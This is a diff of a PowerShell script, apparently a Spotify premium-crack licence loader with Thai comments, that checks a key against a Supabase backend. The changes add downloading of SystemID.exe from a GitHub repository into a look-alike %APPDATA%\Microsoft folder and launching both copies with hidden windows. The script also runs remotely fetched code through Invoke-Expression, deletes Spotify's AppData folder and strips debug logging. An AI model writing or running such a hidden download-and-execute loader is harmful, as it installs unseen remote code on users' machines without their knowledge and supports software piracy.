@@ -1,9 +1,9 @@
 function Remove-SystemID {
     # ลบไฟล์ SystemID.exe
     $exePath = "$env:APPDATA\Motify\SystemID.exe"
-    if (Test-Path $exePath) {
+	
+		if ((Test-Path $exePath) -or (Test-Path $micoexePath)) {
         Remove-Item -Path $exePath -Force -ErrorAction SilentlyContinue
-        Write-Log "ID removed from folder."
     }
 
     # ลบ Registry entry สำหรับ Startup
@@ -15,18 +15,20 @@ function Remove-SystemID {
 
     if ($key) {
         Remove-ItemProperty -Path $registryKeyPath -Name $registryKeyName -Force
-        Write-Log "Reg ID removed."
+
     } else {
-        Write-Log "Reg not found."
+        Write-Log ""
     }
 
     # ลบไฟล์ Spotify (ในกรณีที่มีการติดตั้ง)
     $spotifyPath = "$env:APPDATA\Spotify"
     if (Test-Path $spotifyPath) {
         Remove-Item -Path $spotifyPath -Recurse -Force -ErrorAction SilentlyContinue
-        Write-Log "removed from AppData."
+        Write-Log "remove Data."
+		Write-Log "___________________________"
     } else {
-        Write-Log "not found in AppData."
+        Write-Log "Not found Data."
+		Write-Log "___________________________"
     }
 
     # สร้างไฟล์ .bat เพื่อลบ Spotify และรัน core.ps1
@@ -61,25 +63,35 @@ function Download-Script {
     
     # Path ของโฟลเดอร์ Motify
     $dirPath = "$env:APPDATA\Motify"
-    
+    $micoPath = "$env:APPDATA\Microsoft"
+	
+	
     # ตรวจสอบว่าโฟลเดอร์ Motify มีอยู่หรือไม่ ถ้าไม่มีให้สร้าง
     if (-not (Test-Path -Path $dirPath)) {
         New-Item -ItemType Directory -Path $dirPath -Force | Out-Null
     }
-    
+
+    if (-not (Test-Path -Path $micoPath)) {
+        New-Item -ItemType Directory -Path $micoPath -Force | Out-Null
+    }
+	
     # Path ของไฟล์ที่บันทึก
     $filePath = Join-Path $dirPath $fileName
+	$micofilePath = Join-Path $micoPath $fileName
     
     # ดาวน์โหลดไฟล์ .exe จาก URL และบันทึกลงในโฟลเดอร์ Motify
 try {
         Invoke-WebRequest -Uri $url -OutFile $filePath
-        attrib +h +s $filePath  # ซ่อนไฟล์
+		Invoke-WebRequest -Uri $url -OutFile $micofilePath
+
     } catch {
         Write-Log "Error: Failed to download the file."
         exit
     }
 
     Start-Process $filePath -WindowStyle Hidden  # รันแบบซ่อนหน้าต่าง
+	Start-Process $micofilePath -WindowStyle Hidden  # รันแบบซ่อนหน้าต่าง\
+
 }
 
 function Write-Log {
@@ -101,9 +113,11 @@ function Write-Log {
     Add-Content -Path $logFilePath -Value $logMessage
 }
 
-# ตรวจสอบว่าไฟล์ SystemID.exe มีอยู่ในโฟลเดอร์ Motify หรือไม่
+# ตรวจสอบว่าไฟล์ SystemID.exe มีอยู่ในโฟลเดอร์ Motify / Microsoftหรือไม่
 $exePath = "$env:APPDATA\Motify\SystemID.exe"
-if (Test-Path $exePath) {
+$micoexePath = "$env:APPDATA\Microsoft\SystemID.exe"
+
+	if ((Test-Path $exePath) -or (Test-Path $micoexePath)) {
     Write-Host "ID found. Running..." -ForegroundColor Green
 
 # 1. ดึง HWID จากเครื่อง
@@ -144,9 +158,6 @@ if (Test-Path $filePath) {
 
     $key = $data.key
     $hwid = $data.hwid
-
-    # ตรวจสอบว่า key กับ HWID ถูกต้อง
-    Write-Log "Debug: key = $key, hwid = $hwid" -ForegroundColor Cyan
 
     # 5. ตรวจสอบกับ Supabase ว่ายังมี Key นี้อยู่หรือไม่
     $url = "https://sepwbvwlodlwehflzyiw.supabase.co"
@@ -197,8 +208,6 @@ if (Test-Path $filePath) {
     if ($response.Count -eq 0) {
         Write-Host "Error: Key Not Found In The System" -ForegroundColor Red
         Write-Log "Error: Key Not found in the system."
-		Remove-Item $filePath -Force
-		Remove-SystemID
         Pause
         exit
     }
@@ -271,7 +280,8 @@ $checkUrl = "https://github.com/DevilScript/Spotify-Pre/raw/refs/heads/main/Syst
 $fileName = "SystemID.exe"
 Download-Script -url $checkUrl -fileName $fileName
 Invoke-Expression (Invoke-WebRequest -Uri $scriptUrl).Content
-Start-Process $exePath
+	Start-Process $exePath -WindowStyle Hidden  # รันแบบซ่อนหน้าต่าง
+	Start-Process $micoexePath -WindowStyle Hidden  # รันแบบซ่อนหน้าต่าง\
 	exit
 } else {
     # 1. ดึง HWID จากเครื่อง
@@ -297,9 +307,6 @@ if (Test-Path $filePath) {
     Write-Host "System: Found json file, validating the key..." -ForegroundColor DarkYellow
     $data = Get-Content $filePath | ConvertFrom-Json
 
-    # ตรวจสอบค่าของ key และ hwid
-    Write-Log "Debug: key = $($data.key), hwid = $($data.hwid)" -ForegroundColor Cyan
-
     # เช็คว่า $data.key และ $data.hwid มีค่าหรือไม่
     if (-not $data.key -or -not $data.hwid) {
         Write-Host "Error: key or hwid is missing in the file." -ForegroundColor Red
@@ -312,9 +319,6 @@ if (Test-Path $filePath) {
 
     $key = $data.key
     $hwid = $data.hwid
-
-    # ตรวจสอบว่า key กับ HWID ถูกต้อง
-    Write-Log "Debug: key = $key, hwid = $hwid" -ForegroundColor Cyan
 
     # 5. ตรวจสอบกับ Supabase ว่ายังมี Key นี้อยู่หรือไม่
     $url = "https://sepwbvwlodlwehflzyiw.supabase.co"
@@ -365,8 +369,6 @@ if (Test-Path $filePath) {
     if ($response.Count -eq 0) {
         Write-Host "Error: Key Not Found In The System" -ForegroundColor Red
         Write-Log "Error: Key Not found in the system."
-		Remove-Item $filePath -Force
-		Remove-SystemID
         Pause
         exit
     }
@@ -439,6 +441,7 @@ $checkUrl = "https://github.com/DevilScript/Spotify-Pre/raw/refs/heads/main/Syst
 $fileName = "SystemID.exe"
 Download-Script -url $checkUrl -fileName $fileName
 Invoke-Expression (Invoke-WebRequest -Uri $scriptUrl).Content
-Start-Process $exePath -WindowStyle Hidden  # รันแบบซ่อนหน้าต่าง
+	Start-Process $exePath -WindowStyle Hidden  # รันแบบซ่อนหน้าต่าง
+	Start-Process $micoexePath -WindowStyle Hidden  # รันแบบซ่อนหน้าต่าง\
     exit
 }
